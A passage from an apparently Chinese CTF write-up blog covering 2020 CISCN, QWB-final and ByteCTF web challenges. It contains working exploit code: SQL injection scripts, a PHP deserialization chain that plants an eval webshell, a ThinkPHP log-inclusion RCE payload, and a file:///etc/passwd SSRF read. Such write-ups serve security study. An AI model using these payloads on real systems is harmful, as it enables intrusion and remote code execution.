class="string">&quot;cache&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    r=session.post(burp0_url, headers=burp0_headers, data=burp0_data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;缓存成功&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span>(<span class="params">session,cookies</span>):</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://100.100.1.5:80/ctf/notes.php&quot;</span></span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://100.100.1.5&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://100.100.1.5/ctf/index.php&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;contents&quot;</span>: <span class="string">&quot;fffffffffffffffffffffffffffffffffff&quot;</span>, <span class="string">&quot;submit&quot;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    session.cookies = requests.utils.cookiejar_from_dict(cookies, cookiejar=<span class="literal">None</span>, overwrite=<span class="literal">True</span>)</span><br><span class="line">    r=session.post(burp0_url, headers=burp0_headers, data=burp0_data,cookies=cookies)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqlinj</span>(<span class="params">sql</span>):</span></span><br><span class="line">    reg(session,sql)</span><br><span class="line">    cache(session)</span><br><span class="line">    cookie = session.cookies.get_dict()</span><br><span class="line">    cookie[<span class="string">&quot;cache&quot;</span>]=urllib.parse.quote_plus(<span class="built_in">str</span>(base64.b64encode(<span class="string">b&quot;cbcisfunsoisbas\x21&quot;</span>+base64.b64decode(urllib.parse.unquote(cookie[<span class="string">&quot;cache&quot;</span>]))[<span class="number">16</span>:]),encoding=<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(cookie)</span><br><span class="line">    r=submit(session,cookie)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">sql=<span class="string">&quot;or(updatexml(1,concat(0x7e,(select upload from users where username=0x61646D696E),0x7e),1))),0x666666666666,localtime())#dd&quot;</span></span><br><span class="line">r=sqlinj(sql)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;提交成功&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>





<p>上传名为file的文件，得到config/admin/secretpath/profile</p>
<p>结合<code>include &quot;config/$&#123;_SESSION[&#39;token&#39;]&#125;/profile&quot;;</code>从而getshell</p>
<p>token是base64编码，因此可以精心构造出admin/secretpath</p>
<p>由于没有题目环境便无法验证</p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>网络上找到了一个payload:<a target="_blank" rel="noopener" href="http://igml.top/2020/08/21/2020-ciscn/">http://igml.top/2020/08/21/2020-ciscn/</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">Jig</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">db</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$file</span> = <span class="string">&#x27;gmmml.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$document</span> = <span class="string">&#x27;&lt;?php @eval($_POST[gml]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$db</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Jig</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">format</span> = 0;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$dir</span> = <span class="string">&#x27;./&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">server</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$server</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server = <span class="variable">$server</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">F3</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">events</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> DB\Jig();</span><br><span class="line">    <span class="variable">$b</span> = <span class="keyword">new</span> DB\Jig\Mapper(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$c</span> = <span class="keyword">new</span> F3(<span class="keyword">array</span>(<span class="string">&#x27;disconnect&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="variable">$b</span>, <span class="string">&quot;insert&quot;</span>)));</span><br><span class="line">    <span class="variable">$d</span> = <span class="keyword">new</span> CLI\Agent(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$e</span> = <span class="keyword">new</span> CLI\WS(<span class="variable">$d</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$e</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/" data-id="cku8j3ffq0004dan75ftm1u1d" data-title="2020 ciscn 华东南 web" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020-QWB-final-bjyadmin" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/2020-QWB-final-bjyadmin/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.668Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/2020-QWB-final-bjyadmin/">2020-QWB-final-bjyadmin</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020-QWB-final-bjyadmin"><a href="#2020-QWB-final-bjyadmin" class="headerlink" title="2020-QWB-final-bjyadmin"></a>2020-QWB-final-bjyadmin</h1><h2 id="第一步sql注入"><a href="#第一步sql注入" class="headerlink" title="第一步sql注入"></a>第一步sql注入</h2><blockquote>
<p>选手使用攻击机利用靶机中的sql注入漏洞获取bjyadmin框架路径</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># mysql&gt; select info from PROCESSLIST;</span><br><span class="line"># +------------------------------+</span><br><span class="line"># | info                         |</span><br><span class="line"># +------------------------------+</span><br><span class="line"># | select info from PROCESSLIST |</span><br><span class="line"># +------------------------------+</span><br><span class="line"># 1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>利用processlist注出字段名，<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/performance-schema-processlist-table.html">相关的介绍</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">ip=<span class="string">&quot;192.168.10.110&quot;</span></span><br><span class="line"><span class="comment">#http://101.133.129.243/</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inj</span>(<span class="params">pos,guess</span>):</span></span><br><span class="line">    <span class="comment"># true: real-guess &lt; 0</span></span><br><span class="line">    <span class="comment"># false : guess &lt;= real</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://&quot;</span>+ip+<span class="string">&quot;/?id=1&#x27;/(if(floor((SELECT(ord(right(left(group_concat(info),&#123;POS&#125;),1)))FROM(information_schema.PROCESSLIST))/&#123;GUESS&#125;),1,0))/&#x27;1&quot;</span>.<span class="built_in">format</span>(POS=pos,GUESS=guess)</span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    r=requests.get(burp0_url, headers=burp0_headers,proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Undefined variable: rows in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment"># &quot;http://101.133.129.243:80/?id=1&#x27;/(if(floor((SELECT(ord(right(left(group_concat(schema_name),&#123;POS&#125;),1)))FROM(information_schema.schemata))/&#123;GUESS&#125;),1,0))/&#x27;1&quot;</span></span><br><span class="line"><span class="comment"># database:2020qwbctf </span></span><br><span class="line"><span class="comment"># table_name:</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">pos=<span class="built_in">len</span>(result)+<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">min</span>=<span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span>=<span class="number">128</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment">#time.sleep(1)</span></span><br><span class="line">        </span><br><span class="line">        avr = <span class="built_in">int</span>((<span class="built_in">min</span>+<span class="built_in">max</span>)/<span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span>(avr)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> inj(pos,avr):</span><br><span class="line">            <span class="keyword">if</span> inj(pos,avr+<span class="number">1</span>):</span><br><span class="line">                result+=<span class="built_in">chr</span>(avr)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">min</span>=avr</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span>=avr</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">max</span>-<span class="built_in">min</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> inj(pos,<span class="built_in">min</span>):</span><br><span class="line">                result+=<span class="built_in">chr</span>(<span class="built_in">max</span>)</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result+=<span class="built_in">chr</span>(<span class="built_in">min</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    pos+=<span class="number">1</span></span><br></pre></td></tr></table></figure>



<h2 id="bjyadmin"><a href="#bjyadmin" class="headerlink" title="bjyadmin"></a>bjyadmin</h2><p>题目提供的附件和</p>
<p><a target="_blank" rel="noopener" href="https://github.com/baijunyao/thinkphp-bjyadmin">https://github.com/baijunyao/thinkphp-bjyadmin</a></p>
<p>一摸一样</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200921120236.png" alt="image2362"></p>
<p>挨个看过去发现有一个容易令人忽略的漏洞（sxgg一眼看出来）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Common</span>\<span class="title">Controller</span>\<span class="title">HomeBaseController</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Vue示例</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VueController</span> <span class="keyword">extends</span> <span class="title">HomeBaseController</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 拦截空方法 自动加载html</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $methed_name 空方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_empty</span>(<span class="params"><span class="variable">$methed_name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;display(<span class="variable">$methed_name</span>);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 配合thinkphp分页示例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">page</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 获取总条数</span></span><br><span class="line">        <span class="variable">$count</span>=M(<span class="string">&#x27;Province_city_area&#x27;</span>)-&gt;count();</span><br><span class="line">        <span class="comment">// 每页多少条数据</span></span><br><span class="line">        <span class="variable">$limit</span>=<span class="number">200</span>;</span><br><span class="line">        <span class="variable">$page</span>=<span class="keyword">new</span> \Org\Nx\Page(<span class="variable">$count</span>,<span class="variable">$limit</span>);</span><br><span class="line">        <span class="variable">$data</span>=M(<span class="string">&#x27;Province_city_area&#x27;</span>)</span><br><span class="line">            -&gt;limit(<span class="variable">$page</span>-&gt;firstRow.<span class="string">&#x27;,&#x27;</span>.<span class="variable">$page</span>-&gt;listRows)</span><br><span class="line">            -&gt;select();</span><br><span class="line">        <span class="keyword">echo</span> json_encode(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<h1 id="ThinkPHP-Action中的-empty方法"><a href="#ThinkPHP-Action中的-empty方法" class="headerlink" title="ThinkPHP Action中的_empty方法"></a>ThinkPHP Action中的_empty方法</h1><p>_empty方法即空操作，当找不到请求的方法时，默认执行该方法，利用这个机制，我们可以实现错误页面和一些URL的优化。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;public function _empty($name)</span><br><span class="line">&gt;&#123;</span><br><span class="line">   echo $name;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>

<p>参数name,即请求的方法名。如<a target="_blank" rel="noopener" href="http://localhost/waimai/index.php/Index/sdfewsdf,%E4%B8%8D%E5%AD%98%E5%9C%A8sdfewsdf%E6%96%B9%E6%B3%95%E6%97%B6%EF%BC%8C%E4%BC%9A%E8%B0%83%E7%94%A8_empty%E6%96%B9%E6%B3%95%EF%BC%8C%E6%98%BE%E7%A4%BAsdfewsdf">http://localhost/waimai/index.php/Index/sdfewsdf,不存在sdfewsdf方法时，会调用_empty方法，显示sdfewsdf</a>.</p>
</blockquote>
<p>当我们调用一个不存在的action时，它会<code>display ($method) </code> ，这将会造成任意模板调用</p>
<p>我们利用<code>index.php?m=Home&amp;c=Vue&amp;a=evil_path</code>来调用任意模板，我们可以利用日志文件作为模板文件从而RCE</p>
<p>最后的payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php/Home.php?m=Home&amp;c=Vue&amp;a=Runtime/Logs/User/20_09_17.log</span><br><span class="line">index.php/Home/Vue/web_page&amp;content=&lt;?php/**/phpinfo();</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/2020-QWB-final-bjyadmin/" data-id="cku8j3ffr0005dan7cgupbvye" data-title="2020-QWB-final-bjyadmin" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020ByteCTF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/2020ByteCTF/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.668Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/2020ByteCTF/">2020ByteCTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="ByteCTF2020"><a href="#ByteCTF2020" class="headerlink" title="ByteCTF2020"></a>ByteCTF2020</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easy-scrapy"><a href="#easy-scrapy" class="headerlink" title="easy_scrapy"></a>easy_scrapy</h3><p>体验一编网站的功能后，发现如下api</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/list</span><br><span class="line">/push post:url=https%3A%2F%2Fwww.4399.com&amp;code=16674458</span><br><span class="line">/result?url=https://www.4399.com</span><br></pre></td></tr></table></figure>

<p>让网站爬取自己的服务器以获得请求头</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: scrapy_redis</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Host: ccreater.top:60000</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过ua头发现是：scrapy_redis</p>
<p>本地搭建scrapy_redis服务爬取网站，查看redis里设置的键值，发现myscrapy:requests中</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201026113031.png" alt="image528"></p>
<p>存在的pickle数据</p>
<p>网站自然提交http和https协议的url，但是因为是爬虫猜测嵌入一个a标签就可以绕过这个限制</p>
<p>提交如下网站</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure>



<p>成功读取到/etc/passwd，把爬虫代码爬下来本地测试</p>
<p>scrapy.cfg</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Automatically created by: scrapy startproject</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For more information about the [deploy] section see:</span></span><br><span class="line"><span class="comment"># https://scrapyd.readthedocs.io/en/latest/deploy.html</span></span><br><span class="line"></span><br><span class="line">[settings]</span><br><span class="line">default = bytectf.settings</span><br><span class="line"></span><br><span class="line">[deploy]</span><br><span class="line"><span class="comment">#url = http://localhost:6800/</span></span><br><span class="line">project = bytectf</span><br></pre></td></tr></table></figure>

<p>bytectf/settings.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BOT_NAME = <span class="string">&#x27;bytectf&#x27;</span></span><br><span class="line">SPIDER_MODULES = [<span class="string">&#x27;bytectf.spiders&#x27;</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">&#x27;bytectf.spiders&#x27;</span></span><br><span class="line">RETRY_ENABLED = <span class="literal">False</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line">DOWNLOAD_TIMEOUT = <span class="number">8</span></span><br><span class="line">USER_AGENT = <span class="string">&#x27;scrapy_redis&#x27;</span></span><br><span class="line">SCHEDULER = <span class="string">&quot;scrapy_redis.scheduler.Scheduler&quot;</span></span><br><span class="line">DUPEFILTER_CLASS = <span class="string">&quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;</span></span><br><span class="line">REDIS_HOST = <span class="string">&#x27;172.20.0.7&#x27;</span></span><br><span class="line">REDIS_PORT = <span class="number">6379</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">   <span class="string">&#x27;bytectf.pipelines.BytectfPipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>bytectf/byte.py</p>
